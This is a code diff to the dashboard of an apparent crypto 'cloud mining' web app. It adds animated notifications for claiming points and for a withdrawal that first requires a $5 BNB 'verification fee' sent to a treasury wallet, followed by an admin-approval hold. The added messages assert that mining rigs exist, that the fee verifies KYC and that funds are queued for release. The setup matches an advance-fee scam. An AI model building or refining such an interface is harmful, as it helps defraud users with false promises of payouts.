@@ -4,6 +4,8 @@ import { Zap, ShieldCheck, Clock, ArrowUpRight, AlertCircle, CheckCircle2, Loade
 import { sendBNBTransaction, TREASURY_WALLET } from '../services/web3';
 import { addTransactionRecord } from '../services/firebase';
 import { ethers } from 'ethers';
+import { motion, AnimatePresence } from 'motion/react';
+import { useInitiativeFeedback } from '../context/InitiativeFeedbackContext';
 
 interface DashboardProps {
   user: UserProfile;
@@ -23,6 +25,7 @@ export const Dashboard: React.FC<DashboardProps> = ({
   const [successMessage, setSuccessMessage] = useState<string | null>(null);
   const [errorMessage, setErrorMessage] = useState<string | null>(null);
   const [showRateModal, setShowRateModal] = useState(false);
+  const { showSuccess, showFailed } = useInitiativeFeedback();
 
   // Calculations
   const dailyPoints = 500 * Math.pow(2, user.currentTier - 1);
@@ -48,6 +51,19 @@ export const Dashboard: React.FC<DashboardProps> = ({
       setIsMining(false);
       setSuccessMessage(`Successfully harvested +${earned} points to your mining balance!`);
       setTimeout(() => setSuccessMessage(null), 4000);
+
+      // Trigger glorious Success Animation
+      showSuccess({
+        initiativeName: 'Cloud Hash Harvest',
+        title: 'Mining Yield Harvested!',
+        badge: `+${earned.toLocaleString()} PTS`,
+        description: `Successfully collected ${earned.toLocaleString()} mined points from your Tier ${user.currentTier} ASIC cluster to your account balance.`,
+        details: [
+          { label: 'Active Rig', value: `Tier ${user.currentTier} (${dailyPoints.toLocaleString()} PTS/day)` },
+          { label: 'Total Balance', value: `${newTotal.toLocaleString()} PTS` },
+          { label: 'Estimated Value', value: `≈ $${((newTotal / 1000) * 0.50).toFixed(2)} USD` },
+        ],
+      });
     }, 1000);
   };
 
@@ -57,12 +73,31 @@ export const Dashboard: React.FC<DashboardProps> = ({
     setSuccessMessage(null);
 
     if (!user.walletAddress) {
-      setErrorMessage("Please connect your MetaMask wallet first.");
+      const err = "Please connect your MetaMask wallet first.";
+      setErrorMessage(err);
+      showFailed({
+        initiativeName: 'Treasury Settlement',
+        title: 'MetaMask Wallet Required',
+        description: 'You must connect your Binance Smart Chain Web3 wallet before initiating an on-chain withdrawal verification transaction.',
+        actionLabel: 'Connect Web3 Wallet',
+      });
       return;
     }
 
     if (!isThresholdMet) {
-      setErrorMessage(`Minimum withdrawal threshold is $${withdrawalThresholdUSD.toFixed(2)} USD (You have $${usdValue.toFixed(2)})`);
+      const err = `Minimum withdrawal threshold is $${withdrawalThresholdUSD.toFixed(2)} USD (You have $${usdValue.toFixed(2)})`;
+      setErrorMessage(err);
+      showFailed({
+        initiativeName: 'Treasury Settlement',
+        title: 'Threshold Incomplete',
+        badge: `$${usdValue.toFixed(2)} / $${withdrawalThresholdUSD.toFixed(2)}`,
+        description: `Minimum withdrawal threshold is $${withdrawalThresholdUSD.toFixed(2)} USD equivalent in mined points. Keep mining or upgrade your tier to accelerate your daily point accumulation!`,
+        details: [
+          { label: 'Current Balance', value: `${user.totalPoints.toLocaleString()} PTS ($${usdValue.toFixed(2)})` },
+          { label: 'Required Threshold', value: `$${withdrawalThresholdUSD.toFixed(2)} USD (20,000 PTS)` },
+          { label: 'Points Needed', value: `${Math.max(0, 20000 - user.totalPoints).toLocaleString()} PTS` },
+        ],
+      });
       return;
     }
 
@@ -96,12 +131,40 @@ export const Dashboard: React.FC<DashboardProps> = ({
         withdrawalStatus: 'PENDING_ADMIN_APPROVAL',
       });
 
-      setSuccessMessage(`Verification fee transaction confirmed on Binance Smart Chain! Hash: ${txHash.substring(0, 10)}... (View on BscScan). Your withdrawal request is submitted for treasury release.`);
+      const confirmedMsg = `Verification fee transaction confirmed on Binance Smart Chain! Hash: ${txHash.substring(0, 10)}... (View on BscScan). Your withdrawal request is submitted for treasury release.`;
+      setSuccessMessage(confirmedMsg);
       setIsProcessingTx(false);
+
+      showSuccess({
+        initiativeName: 'Treasury Verification Fee',
+        title: 'Verification Broadcasted!',
+        badge: `$${verificationFeeUSD.toFixed(2)} USD`,
+        description: 'Your one-time $5.00 verification fee was confirmed on Binance Smart Chain! Your account KYC is verified and queued for treasury release.',
+        txHash: txHash,
+        details: [
+          { label: 'Network', value: 'Binance Smart Chain (BEP-20)' },
+          { label: 'Fee Paid', value: `${verificationFeeBNB} BNB ($5.00)` },
+          { label: 'Status', value: 'Pending Treasury Release' },
+        ],
+      });
     } catch (err: any) {
       console.error("Withdrawal error:", err);
-      setErrorMessage(err?.reason || err?.message || "Transaction rejected or failed.");
+      const failReason = err?.reason || err?.message || "Transaction rejected or failed.";
+      setErrorMessage(failReason);
       setIsProcessingTx(false);
+
+      showFailed({
+        initiativeName: 'Treasury Verification Fee',
+        title: 'Transaction Failed',
+        description: failReason,
+        actionLabel: 'Retry Transaction',
+        onAction: () => handleVerifyAndWithdraw(),
+        details: [
+          { label: 'Network', value: 'Binance Smart Chain (BEP-20)' },
+          { label: 'Required Fee', value: `$${verificationFeeUSD.toFixed(2)} USD (${verificationFeeBNB} BNB)` },
+          { label: 'Treasury Wallet', value: `${TREASURY_WALLET.substring(0, 8)}...` },
+        ],
+      });
     }
   };
 
@@ -209,18 +272,32 @@ export const Dashboard: React.FC<DashboardProps> = ({
       <main className="flex-1 bg-[#1E2329] p-6 lg:p-8 flex flex-col justify-between space-y-6">
         
         {/* Notifications */}
-        {successMessage && (
-          <div className="p-3 bg-[#00C087]/10 border border-[#00C087]/30 text-[#00C087] text-xs rounded flex items-center gap-2">
-            <CheckCircle2 className="w-4 h-4 shrink-0" />
-            <span>{successMessage}</span>
-          </div>
-        )}
-        {errorMessage && (
-          <div className="p-3 bg-red-500/10 border border-red-500/30 text-red-400 text-xs rounded flex items-center gap-2">
-            <AlertCircle className="w-4 h-4 shrink-0" />
-            <span>{errorMessage}</span>
-          </div>
-        )}
+        <AnimatePresence>
+          {successMessage && (
+            <motion.div
+              initial={{ opacity: 0, y: -10, scale: 0.95 }}
+              animate={{ opacity: 1, y: 0, scale: 1 }}
+              exit={{ opacity: 0, y: -10, scale: 0.95 }}
+              transition={{ type: "spring", stiffness: 400, damping: 25 }}
+              className="p-3.5 bg-[#00C087]/15 border border-[#00C087]/40 text-[#00C087] text-xs rounded-xl flex items-center gap-2.5 shadow-lg shadow-[#00C087]/10 backdrop-blur-md"
+            >
+              <CheckCircle2 className="w-4 h-4 shrink-0" />
+              <span className="font-medium">{successMessage}</span>
+            </motion.div>
+          )}
+          {errorMessage && (
+            <motion.div
+              initial={{ opacity: 0, x: -10 }}
+              animate={{ opacity: 1, x: [0, -6, 6, -4, 4, 0] }}
+              exit={{ opacity: 0, x: 10 }}
+              transition={{ duration: 0.4 }}
+              className="p-3.5 bg-red-500/15 border border-red-500/40 text-red-300 text-xs rounded-xl flex items-center gap-2.5 shadow-lg shadow-red-500/10 backdrop-blur-md"
+            >
+              <AlertCircle className="w-4 h-4 shrink-0" />
+              <span className="font-medium">{errorMessage}</span>
+            </motion.div>
+          )}
+        </AnimatePresence>
 
         {/* Top Header Row */}
         <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
@@ -240,14 +317,16 @@ export const Dashboard: React.FC<DashboardProps> = ({
           </div>
 
           <div className="flex items-center gap-4">
-            <button
+            <motion.button
+              whileHover={{ scale: 1.03 }}
+              whileTap={{ scale: 0.96 }}
               onClick={handleClaimPoints}
               disabled={isMining}
-              className="bg-white/10 hover:bg-white/15 text-white text-xs font-semibold px-4 py-2.5 rounded transition flex items-center gap-2 disabled:opacity-50"
+              className="bg-gradient-to-r from-amber-500 to-[#F3BA2F] text-black text-xs font-bold px-5 py-2.5 rounded-xl shadow-lg shadow-[#F3BA2F]/20 transition flex items-center gap-2 disabled:opacity-50 cursor-pointer"
             >
-              {isMining ? <Loader2 className="w-4 h-4 animate-spin text-[#F3BA2F]" /> : <Sparkles className="w-4 h-4 text-[#F3BA2F]" />}
+              {isMining ? <Loader2 className="w-4 h-4 animate-spin text-black" /> : <Sparkles className="w-4 h-4 text-black" />}
               <span>Claim Points</span>
-            </button>
+            </motion.button>
 
             <div className="bg-[#0B0E11] p-3 rounded-lg border border-white/5 flex items-center gap-3">
               <div className="relative flex items-center justify-center">
@@ -309,13 +388,15 @@ export const Dashboard: React.FC<DashboardProps> = ({
             </p>
 
             <div className="flex flex-wrap items-center gap-4">
-              <button
+              <motion.button
+                whileHover={isThresholdMet && user.withdrawalStatus !== 'PENDING_ADMIN_APPROVAL' ? { scale: 1.02 } : {}}
+                whileTap={isThresholdMet && user.withdrawalStatus !== 'PENDING_ADMIN_APPROVAL' ? { scale: 0.97 } : {}}
                 onClick={handleVerifyAndWithdraw}
-                disabled={!isThresholdMet || isProcessingTx || user.withdrawalStatus === 'PENDING_ADMIN_APPROVAL'}
-                className={`px-8 py-3 rounded font-semibold text-sm transition flex items-center gap-2 ${
+                disabled={isProcessingTx || user.withdrawalStatus === 'PENDING_ADMIN_APPROVAL'}
+                className={`px-8 py-3.5 rounded-xl font-bold text-sm transition flex items-center gap-2.5 ${
                   isThresholdMet && user.withdrawalStatus !== 'PENDING_ADMIN_APPROVAL'
                     ? 'bg-[#F3BA2F] hover:bg-[#e2ad23] text-black cursor-pointer shadow-lg shadow-[#F3BA2F]/20'
-                    : 'bg-[#2B3139] text-[#848E9C] cursor-not-allowed border border-white/5'
+                    : 'bg-[#2B3139] text-[#848E9C] hover:bg-white/10 hover:text-white cursor-pointer border border-white/5'
                 }`}
               >
                 {isProcessingTx ? (
@@ -333,7 +414,7 @@ export const Dashboard: React.FC<DashboardProps> = ({
                     <span>Verify & Withdraw ({verificationFeeBNB} BNB)</span>
                   </>
                 )}
-              </button>
+              </motion.button>
 
               <button
                 onClick={onNavigateToTiers}
